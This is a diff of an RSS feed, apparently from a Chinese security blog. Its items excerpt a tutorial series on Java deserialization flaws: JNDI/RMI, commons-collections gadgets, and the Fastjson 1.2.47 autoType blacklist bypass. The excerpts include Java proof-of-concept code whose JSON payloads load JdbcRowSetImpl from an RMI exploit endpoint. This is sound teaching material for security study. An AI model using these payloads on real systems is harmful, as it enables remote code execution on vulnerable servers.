@@ -32,10 +32,10 @@ if (lexer.token() == JSONToken.LITERAL_STRING) { // 第二个 @type 的值 Strin
       <description>声明 本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。
 Fastjson &amp;lt;= 1.2.47 POC 随着 fastjson 的更新，以往的安全漏洞都被封堵掉了，但道高一尺，魔高一丈，安全人员发现了一个通杀的漏洞，以往的封堵手段都可以绕过，算是一个里程碑的发现。
 我们首先将 fastjson 升级到 1.2.47 版本，然后使用我们之前的POC进行测试。
-import com.alibaba.fastjson.JSON;  public class Eval3 {   public static void main(String[] args) throws Exception {  String payload = &amp;#34;{\&amp;#34;@type\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;,\&amp;#34;dataSourceName\&amp;#34;:\&amp;#34;rmi://localhost:1099/Exploit\&amp;#34;,\&amp;#34;autoCommit\&amp;#34;:true}&amp;#34;;  JSON.parse(payload);  } } 不出意料的话会出现这样的错误提示信息：
+import com.alibaba.fastjson.JSON; public class Eval3 { public static void main(String[] args) throws Exception { String payload = &amp;#34;{\&amp;#34;@type\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;,\&amp;#34;dataSourceName\&amp;#34;:\&amp;#34;rmi://localhost:1099/Exploit\&amp;#34;,\&amp;#34;autoCommit\&amp;#34;:true}&amp;#34;; JSON.parse(payload); } } 不出意料的话会出现这样的错误提示信息：
 autoType is not support. com.sun.rowset.JdbcRowSetImpl 这是因为 fastjson 使用了黑名单机制，禁止将 com.sun.rowset.JdbcRowSetImpl 反序列化。
 下面我们使用新的 POC 进行测试，又可以利用成功了。
-import com.alibaba.fastjson.JSON;  public class Eval5 {   public static void main(String[] args) throws Exception {  String payload = &amp;#34;{\&amp;#34;a\&amp;#34;:{\&amp;#34;@type\&amp;#34;:\&amp;#34;java.</description>
+import com.alibaba.fastjson.JSON; public class Eval5 { public static void main(String[] args) throws Exception { String payload = &amp;#34;{\&amp;#34;a\&amp;#34;:{\&amp;#34;@type\&amp;#34;:\&amp;#34;java.lang.Class\&amp;#34;,\&amp;#34;val\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;},\&amp;#34;b\&amp;#34;:{\&amp;#34;@type\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;,\&amp;#34;dataSourceName\&amp;#34;:\&amp;#34;rmi://localhost:1099/Exploit\&amp;#34;,\&amp;#34;autoCommit\&amp;#34;:true}}&amp;#34;; JSON.parse(payload); } } payload 格式化之后如下：</description>
     </item>
     
     <item>
@@ -47,11 +47,12 @@ import com.alibaba.fastjson.JSON;  public class Eval5 {   public static void mai
       <description>声明 本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。
 JNDI 是什么 Java命名和目录接口（Java Naming and Directory Interface，缩写JNDI），是Java的一个目录服务应用程序接口（API），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。
 JNDI 包含在Java SE中，不需要引用第三方jar即可使用。要使用 JNDI 必须要有一个或多个服务提供者。JDK 本身已经包括了下面几种服务提供者。
- 轻量级目录访问协议 (LDAP) CORBA 公共对象服务命名（COS naming） Java 远程方法调用 (RMI) 域名服务 (DNS)  这么说起来还是有点抽象，简单理解就是服务提供者提供一个类似Key Value的数据，JNDI可以通过这个 Key 获取到服务提供者上的提供的Value，因此JNDI是无法单独使用的。
+轻量级目录访问协议 (LDAP) CORBA 公共对象服务命名（COS naming） Java 远程方法调用 (RMI) 域名服务 (DNS) 这么说起来还是有点抽象，简单理解就是服务提供者提供一个类似Key Value的数据，JNDI可以通过这个 Key 获取到服务提供者上的提供的Value，因此JNDI是无法单独使用的。
 使用JNDI的方式也很简单，下面就是一个获取远程对象的示例代码。
 // 创建一个上下文对象 InitialContext context = new InitialContext(); // 查找监听在本地 1099 端口上 RMI 服务的 Object 对象 Object obj = context.lookup(&amp;#34;rmi://localhost:1099/Object&amp;#34;); RMI 是什么 RMI 是 Remote Method Invocation 的缩写，中文含义为远程方法调用，即一个Java程序调用调用另一个Java程序暴露出来的方法。
 RMI 有三个概念：
- Registry : 提供服务注册和服务获取，服务端将类名称，存放地址注册到Registry中，以供客户端获取。 Server : 远程方法的提供者。 Client : 远程方法的调用者。  远程方法的定义需要满足两个条件：</description>
+Registry : 提供服务注册和服务获取，服务端将类名称，存放地址注册到Registry中，以供客户端获取。 Server : 远程方法的提供者。 Client : 远程方法的调用者。 远程方法的定义需要满足两个条件：
+实现 java.</description>
     </item>
     
     <item>
@@ -61,16 +62,16 @@ RMI 有三个概念：
       
       <guid>https://typesafe.cn/posts/java-serialization-vulnerability-3/</guid>
       <description>声明 本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。
-Fastjson 是什么  fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。
-  fastjson相对其他JSON库的特点是快。fastjson在阿里巴巴大规模使用，在数万台服务器上部署，fastjson在业界被广泛接受。在2012年被开源中国评选为最受欢迎的国产开源软件之一。
- 以上摘自Fastjson GitHub 介绍。
+Fastjson 是什么 fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。
+fastjson相对其他JSON库的特点是快。fastjson在阿里巴巴大规模使用，在数万台服务器上部署，fastjson在业界被广泛接受。在2012年被开源中国评选为最受欢迎的国产开源软件之一。
+以上摘自Fastjson GitHub 介绍。
 但近年来随着 Fastjson 不断爆出漏洞，各大中小型公司都逐渐弃用 Fastjson ，甚至阿里自己开源的服务注册、配置管理平台 NACOS 在 1.3.0 版本之后都从 Fastjson 替换为了 Jackson (详见 https://github.com/alibaba/nacos/releases/tag/1.3.0) ，可见漏洞危害之大。
 为什么会弃用 Fastjson ？ 想要研究一个产品的漏洞其中有一条很好的途径就是去查询 CVE 编号，但是我在检索之后发现 Fastjson 只有 CVE-2017-18349 这一条，而 Jackson 竟然有高达 76 条。
 这能否证明 Fastjson 比 Jackson 更安全呢？答案并不是，都是半斤八两，有些 Fastjson 里面出现的漏洞在 Jackson 里面也同样存在。
 那为什么会有公司弃用 Fastjson 呢？
 或许是 Jackson 有更完善且公开的漏洞管理机制，或许是国外的月亮比较圆，或许是随大流，也或许是 Fastjson 代码质量不过关（知乎上有很多回答批判 Fastjson 代码糟糕的），真实原因就不得而知了。
 尽管近年来有公司不断弃用 Fastjson ，但还有很多公司在使用，并且已经开发上线的系统想要替换或者升级 Fastjson 还需要时间，因此我们很有必要学习一下 Fastjson 漏洞的产因。
-Fastjson 漏洞产生原因 Fastjson 第一次被爆出有漏洞是官方在2017年3月15日主动披露的，详见 https://github.</description>
+Fastjson 漏洞产生原因 Fastjson 第一次被爆出有漏洞是官方在2017年3月15日主动披露的，详见 https://github.com/alibaba/fastjson/wiki/security_update_20170315 。漏洞影响 1.</description>
     </item>
     
     <item>
@@ -82,7 +83,7 @@ Fastjson 漏洞产生原因 Fastjson 第一次被爆出有漏洞是官方在2017
       <description>声明 本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。
 新的希望 0x00 在上一节中我们介绍了 Java 反序列化漏洞的成因和利用 commons-collections 3.1 搭配 sun.reflect.annotation.AnnotationInvocationHandler 实现远程命令执行的方式。但sun.reflect.annotation.AnnotationInvocationHandler 的问题已经在最新版 jdk 中修复，可利用范围仅能够局限于旧版本的jdk。经过安全人员的审计，另一个类 javax.management.BadAttributeValueExpException 出现在了安全人员的视野。
 javax.management.BadAttributeValueExpException 继承自 java.lang.Exception，java.lang.Exception 继承自 java.lang.Throwable，而 java.lang.Throwable 实现了 java.io.Serializable。因此 javax.management.BadAttributeValueExpException 符合了 可序列化 这个要求，同样的它也增加了 readObject 方法，这个类的完整代码如下：
-package javax.management;  import java.io.IOException; import java.io.ObjectInputStream;   /** * Thrown when an invalid MBean attribute is passed to a query * constructing method. This exception is used internally by JMX * during the evaluation of a query. User code does not usually * see it.</description>
+package javax.management; import java.io.IOException; import java.io.ObjectInputStream; /** * Thrown when an invalid MBean attribute is passed to a query * constructing method. This exception is used internally by JMX * during the evaluation of a query. User code does not usually * see it.</description>
     </item>
     
     <item>
@@ -95,7 +96,7 @@ package javax.management;  import java.io.IOException; import java.io.ObjectInpu
 序列化的定义 序列化是指将数据结构或对象状态转换成可取用格式，以留待后续在相同或另一台计算机环境中，能恢复原先状态的过程。依照序列化格式重新获取字节的结果时，可以利用它来产生与原始对象相同语义的副本。
 Java 中的序列化 Java 自身提供了序列化的功能，需要实现 java.io.Serializable 接口，标明该对象是可序列化的。 java.io.Serializable 是一个空接口，不需要对象实现方法。
 以下面这段代码为例，展示了一个对象的序列化和反序列化的过程。
-import java.io.*; import java.nio.charset.StandardCharsets; import java.util.Base64;  public class Eval0 {   public static class Command implements Serializable {  private String cmd;   public String getCmd() {  return cmd;  }  public void setCmd(String cmd) {  this.cmd = cmd;  }  }   public static void main(String[] args) throws Exception {  // 定义一个对象  Command command = new Command();  command.</description>
+import java.io.*; import java.nio.charset.StandardCharsets; import java.util.Base64; public class Eval0 { public static class Command implements Serializable { private String cmd; public String getCmd() { return cmd; } public void setCmd(String cmd) { this.cmd = cmd; } } public static void main(String[] args) throws Exception { // 定义一个对象 Command command = new Command(); command.setCmd(&amp;#34;calc&amp;#34;); System.out.println(&amp;#34;序列化前: &amp;#34; + command.getCmd()); // 将用户序列化为字节数组 ByteArrayOutputStream buffer = new ByteArrayOutputStream(); try (ObjectOutputStream outputStream = new ObjectOutputStream(buffer)) { outputStream.</description>
     </item>
     
   </channel>
